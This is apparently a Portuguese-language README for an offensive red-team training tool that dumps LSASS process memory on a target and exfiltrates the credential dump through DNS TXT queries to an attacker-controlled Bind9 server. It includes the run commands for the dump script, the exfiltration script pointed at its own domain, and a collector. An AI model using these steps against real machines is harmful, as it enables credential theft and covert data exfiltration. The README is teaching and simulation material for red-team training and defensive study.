# 🧠 LSASSGhost-DNS

**LSASSGhost-DNS** é uma ferramenta didática de exfiltração furtiva de dados de credenciais do processo LSASS via DNS, totalmente containerizada com Bind9 e Python. Ideal para labs de Red Team, demonstrações de TTPs evasivas e treinamentos práticos.

> ⚠️ *Este projeto é exclusivamente para fins educacionais e simulações controladas de segurança ofensiva.*

---

## 🚀 Visão Geral

Este projeto simula um ataque em que:
- O processo `lsass.exe` é dumpado na máquina-alvo.
- O conteúdo é fragmentado, codificado e enviado via requisições **DNS TXT** para um domínio controlado pelo atacante.
- Um servidor DNS autoritativo (Bind9 em container) coleta os pacotes.
- Um coletor reagrupa os dados e reconstrói o dump.

---

## 🧰 Estrutura do Projeto

```
LSASSGhost-DNS/
├── docker-compose.yml
├── dns-server/           ← Servidor Bind9 autoritativo (mindsecurity.org)
│   ├── Dockerfile
│   ├── named.conf
│   └── zones/
│       └── mindsecurity.org.zone
├── client/               ← Scripts da máquina "vítima"
│   ├── lsass_dump.ps1
│   ├── dns_exfil.py
│   ├── exfil_utils.py
├── collector/            ← Coleta e reagrupamento dos chunks
│   ├── collector.py
│   └── received_chunks/
└── README.md
```

---

## ⚙️ Requisitos

- [x] Docker e Docker Compose
- [x] Python 3.10+
- [x] PowerShell (para execução manual ou simulação)

---

## 🧪 Como Rodar

### 1. Clone o projeto

```bash
git clone https://github.com/marcostolosa/LSASSGhost-DNS.git
cd LSASSGhost-DNS
```

### 2. Suba toda a estrutura

```bash
docker-compose up --build -d
```

- Isso sobe o servidor DNS autoritativo `mindsecurity.org`, pronto para receber registros TXT.

---

## 🖥️ Fluxo do Ataque

1. **Dump do LSASS** (simulado com arquivo `lsass.dmp`):
   ```powershell
   .\lsass_dump.ps1
   ```

2. **Exfiltração via DNS**:
   ```bash
   python3 client/dns_exfil.py --file lsass.dmp --domain mindsecurity.org
   ```

3. **Coletor ativo** (em outro terminal):
   ```bash
   python3 collector/collector.py --zone-logs dns-server/logs/
   ```

---

## ✨ Funcionalidades

- ✅ DNS TXT exfiltration real
- ✅ Codificação base32 para compatibilidade
- ✅ Chunking automático
- ✅ Reconstrução com script único
- ✅ Simulação controlada para labs e aulas

---

## 📚 Casos de Uso

- Treinamento de Red Team
- Aulas práticas de exfiltração furtiva
- Demonstração de falhas em DNS e segmentação
- Simulação de TTPs baseadas em APTs reais (MITRE T1048.003)

---

## 🧠 Referências Técnicas

- [MITRE ATT&CK T1048.003 – Exfiltration Over Alternative Protocol: DNS](https://attack.mitre.org/techniques/T1048/003/)
- [Procdump + Mimikatz para LSASS](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
- [DNS TXT record abuse in APT campaigns](https://www.fireeye.com/blog/threat-research/2019/03/apt40-espionage-group.html)

---

## ⚠️ Aviso Legal

> Este projeto é destinado exclusivamente para ambientes controlados, testes em laboratório, pesquisa e fins educacionais. **O uso indevido pode ser ilegal e viola leis de segurança da informação.** Use com responsabilidade.

---

## 🤝 Contribua

Pull requests, issues e forks são bem-vindos. Este projeto será expandido com suporte a:
- DNS over HTTPS (DoH)
- Integração com Interact.sh
- Versão stealth com C2 modular

---

## 🧑‍💻 Autor

**Marcos Tolosa**  
🔗 [LinkedIn](https://linkedin.com/in/marcos-tolosa)  
🏆 [HackTheBox Top 100 HoF](https://app.hackthebox.com/profile/44238)  
🌐 [mindsecurity.org](https://mindsecurity.org)

